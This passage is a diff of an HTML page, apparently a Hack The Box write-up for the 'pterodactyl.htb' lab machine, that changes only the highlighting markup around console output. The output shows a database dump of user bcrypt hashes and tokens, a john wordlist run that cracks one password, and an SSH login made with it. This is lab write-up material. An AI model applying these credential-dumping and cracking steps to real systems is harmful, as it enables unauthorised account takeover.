-</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="go">             username: headmonitor
-</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="go">                email: headmonitor@pterodactyl.htb
-</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="go">           name_first: Head
-</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="go">            name_last: Monitor
-</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="go">             password: $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
-</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="go">       remember_token: OL0dNy1nehBYdx9gQ5CT3SxDUQtDNrs02VnNesGOObatMGzKvTJAaO0B1zNU
-</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="go">             language: en
-</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="go">           root_admin: 1
-</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="go">             use_totp: 0
-</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="go">          totp_secret: NULL
-</span></span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="go">totp_authenticated_at: NULL
-</span></span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="go">             gravatar: 1
-</span></span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="go">           created_at: 2025-09-16 17:15:41
-</span></span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="go">           updated_at: 2025-09-16 17:15:41
-</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="go">*************************** 2. row ***************************
-</span></span></span><span class="line"><span class="ln">21</span><span class="cl"><span class="go">                   id: 3
-</span></span></span><span class="line"><span class="ln">22</span><span class="cl"><span class="go">          external_id: NULL
-</span></span></span><span class="line"><span class="ln">23</span><span class="cl"><span class="go">                 uuid: ac7ba5c2-6fd8-4600-aeb6-f15a3906982b
-</span></span></span><span class="line"><span class="ln">24</span><span class="cl"><span class="go">             username: phileasfogg3
-</span></span></span><span class="line"><span class="ln">25</span><span class="cl"><span class="go">                email: phileasfogg3@pterodactyl.htb
-</span></span></span><span class="line"><span class="ln">26</span><span class="cl"><span class="go">           name_first: Phileas
-</span></span></span><span class="line"><span class="ln">27</span><span class="cl"><span class="go">            name_last: Fogg
-</span></span></span><span class="line"><span class="ln">28</span><span class="cl"><span class="go">             password: $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi
-</span></span></span><span class="line"><span class="ln">29</span><span class="cl"><span class="go">       remember_token: 6XGbHcVLLV9fyVwNkqoMHDqTQ2kQlnSvKimHtUDEFvo4SjurzlqoroUgXdn8
-</span></span></span><span class="line"><span class="ln">30</span><span class="cl"><span class="go">             language: en
-</span></span></span><span class="line"><span class="ln">31</span><span class="cl"><span class="go">           root_admin: 0
-</span></span></span><span class="line"><span class="ln">32</span><span class="cl"><span class="go">             use_totp: 0
-</span></span></span><span class="line"><span class="ln">33</span><span class="cl"><span class="go">          totp_secret: NULL
-</span></span></span><span class="line"><span class="ln">34</span><span class="cl"><span class="go">totp_authenticated_at: NULL
-</span></span></span><span class="line"><span class="ln">35</span><span class="cl"><span class="go">             gravatar: 1
-</span></span></span><span class="line"><span class="ln">36</span><span class="cl"><span class="go">           created_at: 2025-09-16 19:44:19
-</span></span></span><span class="line"><span class="ln">37</span><span class="cl"><span class="go">           updated_at: 2025-11-07 18:28:50
-</span></span></span><span class="line"><span class="ln">38</span><span class="cl"><span class="go">2 rows in set (0.001 sec)
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>MariaDB [panel]&gt; select * from users \G;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>*************************** 1. row ***************************
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>                   id: 2
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>          external_id: NULL
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>                 uuid: 5e6d956e-7be9-41ec-8016-45e434de8420
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>             username: headmonitor
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>                email: headmonitor@pterodactyl.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>           name_first: Head
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>            name_last: Monitor
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>             password: $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>       remember_token: OL0dNy1nehBYdx9gQ5CT3SxDUQtDNrs02VnNesGOObatMGzKvTJAaO0B1zNU
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>             language: en
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>           root_admin: 1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>             use_totp: 0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span>          totp_secret: NULL
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span>totp_authenticated_at: NULL
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span><span>             gravatar: 1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span>           created_at: 2025-09-16 17:15:41
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span><span>           updated_at: 2025-09-16 17:15:41
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span><span>*************************** 2. row ***************************
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span><span>                   id: 3
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span><span>          external_id: NULL
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span><span>                 uuid: ac7ba5c2-6fd8-4600-aeb6-f15a3906982b
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span><span>             username: phileasfogg3
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span><span>                email: phileasfogg3@pterodactyl.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span><span>           name_first: Phileas
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span><span>            name_last: Fogg
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span><span>             password: $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span><span>       remember_token: 6XGbHcVLLV9fyVwNkqoMHDqTQ2kQlnSvKimHtUDEFvo4SjurzlqoroUgXdn8
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span>             language: en
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span><span>           root_admin: 0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span><span>             use_totp: 0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span><span>          totp_secret: NULL
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span><span>totp_authenticated_at: NULL
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span><span>             gravatar: 1
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span><span>           created_at: 2025-09-16 19:44:19
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span><span>           updated_at: 2025-11-07 18:28:50
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span><span>2 rows in set (0.001 sec)
+</span></span></code></pre></div></div>
 
 <h4 class="relative group">password cracking
     <div id="password-cracking" class="anchor"></div>
@@ -1351,18 +1351,18 @@
     
 </h4>
 <p>I extracted the hashes and attempted to crack them using john:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="gp">$</span> cat hashes.txt
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="go">headmonitor:$2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
-</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="go">phileasfogg3:$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi
-</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="err">
-</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="gp">$</span> john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt --format<span class="o">=</span>bcrypt hashes.txt
-</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="go">Using default input encoding: UTF-8
-</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="go">Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
-</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="go">Cost 1 (iteration count) is 1024 for all loaded hashes
-</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="go">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
-</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="go">!QAZ2wsx         (phileasfogg3)     
-</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="go">1g 0:00:03:42 DONE (2026-02-11 15:23) 0.004497g/s 316.2p/s 632.5c/s
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>$ cat hashes.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>headmonitor:$2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>phileasfogg3:$2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>$ john --wordlist<span style="color:#f92672">=</span>/usr/share/wordlists/rockyou.txt --format<span style="color:#f92672">=</span>bcrypt hashes.txt
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>Loaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>Cost 1 (iteration count) is 1024 for all loaded hashes
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>!QAZ2wsx         (phileasfogg3)     
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>1g 0:00:03:42 DONE (2026-02-11 15:23) 0.004497g/s 316.2p/s 632.5c/s
+</span></span></code></pre></div></div>
 <p>cracked <code>phileasfogg3</code>&rsquo;s password: <code>!QAZ2wsx</code></p>
 <hr>
 
@@ -1376,13 +1376,13 @@
     
 </h3>
 <p>The password worked for SSH authentication:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> ssh phileasfogg3@pterodactyl.htb
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">phileasfogg3@pterodactyl.htb&#39;s password: !QAZ2wsx
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="go">Have a lot of fun...
-</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="go">Last login: Mon Sep 16 19:44:51 2025 from 10.10.14.15
-</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="go">phileasfogg3@pterodactyl:~$ id
-</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="go">uid=1002(phileasfogg3) gid=100(users) groups=100(users)
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ ssh phileasfogg3@pterodactyl.htb
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>phileasfogg3@pterodactyl.htb&#39;s password: !QAZ2wsx
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>Have a lot of fun...
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>Last login: Mon Sep 16 19:44:51 2025 from 10.10.14.15
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>phileasfogg3@pterodactyl:~$ id
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>uid=1002(phileasfogg3) gid=100(users) groups=100(users)
+</span></span></code></pre></div></div>
 
           
           
